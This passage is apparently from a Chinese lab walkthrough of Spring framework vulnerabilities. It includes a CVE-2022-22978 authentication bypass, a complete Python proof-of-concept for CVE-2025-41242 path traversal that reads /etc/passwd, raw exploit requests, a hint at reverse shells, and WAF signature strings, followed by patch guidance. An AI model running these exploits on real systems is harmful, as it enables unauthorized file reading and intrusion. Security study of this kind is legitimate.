利用完成后，必须将 pattern 设置为空，否则每次请求都会写入新的恶意代码在 JSP Webshell 中，导致这个文件变得很大，发送如下数据包将其设置为空：
```http wrap
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1
Host: 192.168.197.88:8080
```
![](images/Pasted%20image%2020261010221209.png)
将 `cmd=id` 替换为反弹 Shell 命令即可获取 Shell，后续不再演示。

> **注意**：该漏洞会修改目标服务器配置，实际测试中可能导致目标崩溃（需要重启才能恢复），请谨慎操作。

### 9. CVE-2022-22978（Spring Security 认证绕过）

Spring Security 用于在 Spring 框架中提供安全认证功能。在 Spring Security 5.5.6、5.6.3 及更早的不受支持版本中，使用带有 `.` 的正则表达式的 RegexRequestMatcher 的应用程序可能存在认证绕过漏洞。

**① 正常访问被拒绝**

访问 `http://192.168.197.88:8080/admin/index`，可以看到管理页面访问被阻止（403 Forbidden）。
![](images/Pasted%20image%2020261010222410.png)
**② 绕过认证**

访问以下 URL 即可绕过认证，成功访问管理页面：
```text wrap
http://192.168.197.88:8080/admin/%0aindex
http://192.168.197.88:8080/admin/%0dindex
```
`%0a` 和 `%0d` 是 URL 编码中的两个特殊字符：

| 编码    | 字符   | ASCII 码 | 含义                      |
| ----- | ---- | ------- | ----------------------- |
| `%0a` | `\n` | 10      | 换行符（Line Feed，LF）       |
| `%0d` | `\r` | 13      | 回车符（Carriage Return，CR） |


![](images/Pasted%20image%2020261010223545.png)



**注意：这个漏洞不能直接反弹 Shell。** 这个漏洞是认证绕过（Authorization Bypass），不是远程代码执行（RCE）。它只能让你绕过权限检查，访问原本需要登录才能访问的页面或接口，但并不能直接执行系统命令。

**反弹 Shell 需要 RCE**：必须能在服务器上执行系统命令（例如调用 Runtime.exec()、上传 Webshell 等）。  CVE-2022-22978 本身不提供任何命令执行能力，所以无法直接弹 Shell。

**如果想拿 Shell，需要结合其他利用点，例如：**
- 后台有**文件上传**功能 → 上传 JSP Webshell
- 后台有**命令执行**功能 → 直接执行反弹 Shell 命令
- 后台有**反序列化**接口 → 触发反序列化 RCE

### 10. CVE-2025-41242（Spring + Jetty 路径穿越）

Spring 框架的 StringUtils.uriDecode 存在 "Ghost Bits" 缺陷，高位 Unicode 字符的低 8 位被截断为 ASCII 字符，导致安全检查被绕过。

例如 `阮(U+962E)→0x2E='.'`、`严(U+4E25)→0x25='%'`、`灵(U+7075)→0x75='u'`、`丰(U+4E30)→0x30='0'`、`甲(U+7532)→0x32='2'`、`来(U+6765)→0x65='e'`，于是攻击者构造的字符串 `阮严灵丰丰甲来` 被静默地转换成 ASCII 字符串 `.%u002e`。

而 Jetty 在后续处理时又将 `%u002e` 解码为 `.`，最终实现路径穿越。

**① 漏洞触发条件**

- 必须以 `阮严灵丰丰甲来` 的**原始 UTF-8 字节**直送服务端，不能预先 percent-encoding（percent-encoding 就是 URL 编码，也叫百分号编码）。
- 目标文件名中至少有一个字符做 percent-encoding（如 `passwd` 写成 `passw%64`），否则 Spring 的路径匹配会提前短路，根本不会调用到那段有问题的解码逻辑。。
- 浏览器、curl、Burp Suite 等工具会自动规范化 URL，无法直接复现，因为它们在发送请求前会对 URL 路径做规范化处理，把高位 Unicode 字符自动编码为 ASCII（变成 `%E9%98%AE...` 或 `.%u002e`），从而破坏漏洞触发条件。要复现，必须使用允许逐字节构造并发送原始 HTTP 请求的工具。。

**② 方式一：使用 Python socket 脚本**

目录下提供了 `poc.py`，它会将原始 UTF-8 字节直接写入 socket，绕过 URL 规范化：
```python wrap
#!/usr/bin/env python3
"""
PoC for CVE-2025-41242: Spring Framework path traversal via Jetty URI
parsing inconsistency on embedded Jetty.
"""
from __future__ import annotations
import argparse
import socket
import ssl
import sys
from urllib.parse import urlparse
GHOST_BITS_SEG = '阮严灵丰丰甲来'.encode('utf-8')
DEFAULT_PORTS = {'http': 80, 'https': 443}

def encode_target_path(file_path: str) -> bytes:
    """Strip the leading slash and percent-encode the last character.
    Spring's path matcher short-circuits when no character is percent-encoded,
    so at least one byte of the target filename must be encoded for the buggy
    decoder to fire (e.g. 'passwd' -> 'passw%64').
    """
    path = file_path.lstrip('/')
    if not path:
        raise ValueError('file path must not be empty')
    last = path[-1]
    if not last.isascii():
        raise ValueError('last character of the file path must be ASCII')
    return path[:-1].encode('utf-8') + ('%%%02x' % ord(last)).encode()

def parse_target(url: str) -> tuple[str, str, int]:
    if '://' not in url:
        url = 'http://' + url
    parsed = urlparse(url)
    if parsed.scheme not in DEFAULT_PORTS:
        raise ValueError(
            f'only http/https are supported (got {parsed.scheme!r})'
        )
    if not parsed.hostname:
        raise ValueError(f'cannot parse host from {url!r}')
    port = parsed.port or DEFAULT_PORTS[parsed.scheme]
    return parsed.scheme, parsed.hostname, port

def build_request(host: str, port: int, file_path: str) -> bytes:
    encoded_target = encode_target_path(file_path)
    path = b'/' + (GHOST_BITS_SEG + b'/') * 7 + encoded_target
    host_header = f'{host}:{port}'.encode()
    return (
        b'GET ' + path + b' HTTP/1.1\r\n'
        b'Host: ' + host_header + b'\r\n'
        b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' + b'\r\n'
        b'Connection: close\r\n\r\n'
    )

def send(
    scheme: str,
    host: str,
    port: int,
    request: bytes,
    timeout: float,
    insecure: bool,
) -> bytes:
    sock = socket.create_connection((host, port), timeout=timeout)
    if scheme == 'https':
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    with sock:
        sock.sendall(request)
        chunks = []
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    return b''.join(chunks)

def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            'PoC for CVE-2025-41242: Spring Framework path traversal on '
            'embedded Jetty. Reads an arbitrary file from the target server.'
        ),
        epilog='example: python poc.py http://192.168.1.160:8080 -f /etc/passwd',
    )
    parser.add_argument(
        'target',
        help='target URL or host:port, e.g. http://192.168.1.160:8080',
    )
    parser.add_argument(
        '-f', '--file',
        default='/etc/passwd',
        help='absolute path of the file to read (default: /etc/passwd)',
    )
    parser.add_argument(
        '--timeout', type=float, default=10.0,
        help='socket timeout in seconds (default: 10)',
    )
    parser.add_argument(
        '-k', '--insecure', action='store_true',
        help='skip TLS certificate verification when using https',
    )
    args = parser.parse_args()
    try:
        scheme, host, port = parse_target(args.target)
        request = build_request(host, port, args.file)
    except ValueError as e:
        print(f'error: {e}', file=sys.stderr)
        return 2
    try:
        data = send(
            scheme, host, port, request,
            timeout=args.timeout, insecure=args.insecure,
        )
    except OSError as e:
        print(
            f'error: connection to {scheme}://{host}:{port} failed: {e}',
            file=sys.stderr,
        )
        return 1
    # Send response headers to stderr and the body to stdout, so the body can
    # be redirected cleanly: `python poc.py <target> -f /etc/passwd > out`.
    header, sep, body = data.partition(b'\r\n\r\n')
    sys.stderr.buffer.write(header + sep)
    sys.stderr.flush()
    sys.stdout.buffer.write(body)
    return 0

if __name__ == '__main__':
    raise SystemExit(main())
```

该POC脚本默认读取靶机环境中的 `/etc/passwd`：
```text wrap
python3 poc.py http://192.168.197.88:8080
```
![](images/Pasted%20image%2020261010230414.png)
可以指定读取其他文件：
```text wrap
python3 poc.py http://192.168.197.88:8080 -f /etc/hosts
```
![](images/Pasted%20image%2020261010230429.png)
HTTPS 目标加 `-k` 跳过证书校验（这个靶场没开HTTPS服务）：
```text wrap
python3 poc.py https://192.168.197.88:8443 -f /etc/passwd -k
```

**③ 方式二：使用 Yakit 原始数据包**

在 Yakit 的 HTTP Fuzzer 中粘贴以下数据包：
```text wrap
GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1
Host: 192.168.197.88:8080
Connection: close
```

发送后即可看到 `/etc/passwd` 内容。
![](images/Pasted%20image%2020261010231133.png)
## 三、漏洞原理总结

| 漏洞编号 | CVE | 注入点 | 利用方式 |
|---------|-----|--------|---------|
| CVE-2016-4977 | CVE-2016-4977 | OAuth2 错误参数 | `response_type` 参数 SpEL 注入 |
| CVE-2017-4971 | CVE-2017-4971 | WebFlow 数据绑定 field | 表单字段 SpEL 注入 |
| CVE-2017-8046 | CVE-2017-8046 | JSON Patch path | PATCH 请求 SpEL 注入 |
| CVE-2018-1270 | CVE-2018-1270 | STOMP selector | 消息订阅 SpEL 注入 |
| CVE-2018-1273 | CVE-2018-1273 | 注册参数绑定 | `username[...]` SpEL 注入 |
| CVE-2022-22947 | CVE-2022-22947 | Actuator 路由配置 | 添加路由触发 SpEL 执行 |
| CVE-2022-22963 | CVE-2022-22963 | HTTP 请求头 | `routing-expression` 头 SpEL 注入 |
| CVE-2022-22965 | CVE-2022-22965 | 数据绑定 | `class.module.classLoader` 链篡改 Tomcat 日志 |
| CVE-2022-22978 | CVE-2022-22978 | 正则表达式 | `.` 匹配绕过认证 |
| CVE-2025-41242 | CVE-2025-41242 | URI 解码 | Ghost Bits 路径穿越 |

**核心本质**：Spring 漏洞家族中，SpEL 表达式注入占据了绝大多数。所有 SpEL 注入的 Payload 都遵循相似的逻辑——调用 `Runtime.getRuntime().exec()` 执行命令，区别只在于**注入入口**不同（HTTP 头、请求参数、JSON Patch、WebSocket 消息等）。CVE-2022-22965 走的是数据绑定路线，CVE-2025-41242 则是 URI 解码不一致导致的路径穿越，两者都是非常独特且值得深入研究的漏洞。


## 四、修复方案

| 漏洞 | 修复版本 | 临时措施 |
|------|---------|---------|
| CVE-2016-4977 | Spring Security OAuth 2.0.10+ | 升级框架版本 |
| CVE-2017-4971 | Spring WebFlow 2.4.5+ | 升级框架版本 |
| CVE-2017-8046 | Spring Data REST 2.6.7+ / 3.0 RC3+ | 升级框架版本 |
| CVE-2018-1270 | Spring Messaging 5.0.5+ / 4.3.16+ | 升级框架版本 |
| CVE-2018-1273 | Spring Data Commons 2.0.6+ / 1.13.11+ | 升级框架版本 |
| CVE-2022-22947 | Spring Cloud Gateway 3.1.1+ / 3.0.7+ | 禁用或限制 Actuator 端点 |
| CVE-2022-22963 | Spring Cloud Function 3.2.3+ | 升级框架版本 |
| CVE-2022-22965 | Spring Framework 5.3.18+ / 5.2.20+ | 升级 JDK 至 9+ 并更新 Spring |
| CVE-2022-22978 | Spring Security 5.5.7+ / 5.6.4+ | 升级框架版本 |
| CVE-2025-41242 | Spring Framework 5.3.44+ / 6.0.30+ / 6.1.22+ / 6.2.10+ | 升级框架版本 |

**通用建议**：
1. 及时升级 Spring 框架及相关组件到最新安全版本
2. 避免将用户输入直接拼接到 SpEL 表达式中
3. 限制 Actuator 端点的对外暴露（生产环境应禁用）
4. 使用 WAF 拦截包含 `T(java.lang.Runtime)`、`ProcessBuilder`、`getRuntime()` 等特征的恶意请求
5. 保持 JDK 版本更新，避免使用存在已知安全问题的旧版本